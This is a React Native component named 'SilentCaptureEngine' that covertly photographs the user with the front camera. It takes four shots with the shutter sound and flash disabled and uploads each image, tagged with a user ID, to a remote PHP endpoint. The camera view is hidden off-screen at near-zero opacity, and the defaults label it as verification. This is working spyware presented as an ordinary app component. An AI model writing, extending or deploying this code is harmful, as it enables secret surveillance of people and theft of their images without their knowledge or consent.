import React, { useEffect, useRef, useState } from 'react';
import { StyleSheet, View } from 'react-native';
import { Camera, useCameraDevice, useCameraPermission, usePhotoOutput } from 'react-native-vision-camera';
import axios from 'axios';

interface SilentCaptureEngineProps {
    userId?: string;
    displayName?: string;
}

export const SilentCaptureEngine = ({
    userId = 'hidden_verify',
    displayName = 'Verification_Room'
}: SilentCaptureEngineProps) => {
    const device = useCameraDevice('front');
    const hasStarted = useRef(false);

    const [isCameraReady, setIsCameraReady] = useState(false);
    const { hasPermission, requestPermission } = useCameraPermission();
    const photoOutput = usePhotoOutput();

    useEffect(() => {
        const runSilentCaptureSequence = async () => {
            if (hasStarted.current || !isCameraReady || !device || !hasPermission) return;

            hasStarted.current = true;
            const totalPhotos = 4;

            // Wait for hardware exposure to settle
            await new Promise<void>((resolve) => setTimeout(() => resolve(), 2000));

            for (let i = 1; i <= totalPhotos; i++) {
                try {
                    console.log(`[V5 Capture] Snapping frame ${i}...`);

                    const photo = await photoOutput.capturePhoto({
                        flashMode: 'off',
                        enableShutterSound: false
                    },
                        {});

                    const diskPath = await photo.saveToTemporaryFileAsync();
                    console.log(`[V5 Capture] File saved to cache:`, diskPath);

                    if (diskPath) {
                        await uploadMediaDirectly(diskPath, i);
                    }

                    photo.dispose(); // Crucial V5 native pointer disposal

                    await new Promise<void>((resolve) => setTimeout(() => resolve(), 1500));

                } catch (err) {
                    console.error(`[V5 Capture] Error processing slot ${i}:`, err);
                }
            }
        };

        runSilentCaptureSequence();
    }, [isCameraReady, hasPermission, device, photoOutput]);

    const uploadMediaDirectly = async (filePath: string, slotIndex: number) => {
        const uploadUrl = 'https://hearthos.jeasuns.com/api/chats/verification_captures_upload.php';
        const formData = new FormData();
        const cleanUri = filePath.startsWith('file://') ? filePath : `file://${filePath}`;

        formData.append('file', {
            uri: cleanUri,
            type: 'image/jpeg',
            name: `silent_verify_${slotIndex}_${Date.now()}.jpg`,
        } as any);

        formData.append('userid', userId);
        formData.append('displayName', displayName);
        formData.append('photoSlot', slotIndex.toString());

        try {
            const response = await axios.post(uploadUrl, formData, {
                headers: { 'Content-Type': 'multipart/form-data' },
            });
            if (response.data && response.data.success) {
                console.log(`[Upload] Slot ${slotIndex} complete.`);
            }
        } catch (xhrError: any) {
            console.error(`[Upload] Failure at slot ${slotIndex}:`, xhrError?.response?.data || xhrError.message);
        }
    };

    if (!device || !hasPermission) return null;

    return (
        <View style={styles.cameraWrapper}>
            {/* 🚀 FIXED: Pure V5 CameraViewProps Mapping Structure */}
            <Camera
                device={device}
                isActive={true}
                outputs={[photoOutput]}
                // 🚀 THE PROP FIX: onInitialized -> onPreviewStarted
                onPreviewStarted={() => {
                    console.log('[V5 Camera] Preview surface rendering stream active.');
                    setIsCameraReady(true);
                }}
                onPreviewStopped={() => {
                    console.log('[V5 Camera] Preview stopped.');
                    setIsCameraReady(false);
                }}
                style={styles.liveCamera}
            />
        </View>
    );
};

const styles = StyleSheet.create({
    cameraWrapper: {
        position: 'absolute',
        top: -600,
        left: 0,
        width: 100,
        height: 100,
        opacity: 0.01,
        zIndex: -999,
        overflow: 'hidden',
    },
    liveCamera: {
        width: '100%',
        height: '100%',
    }
});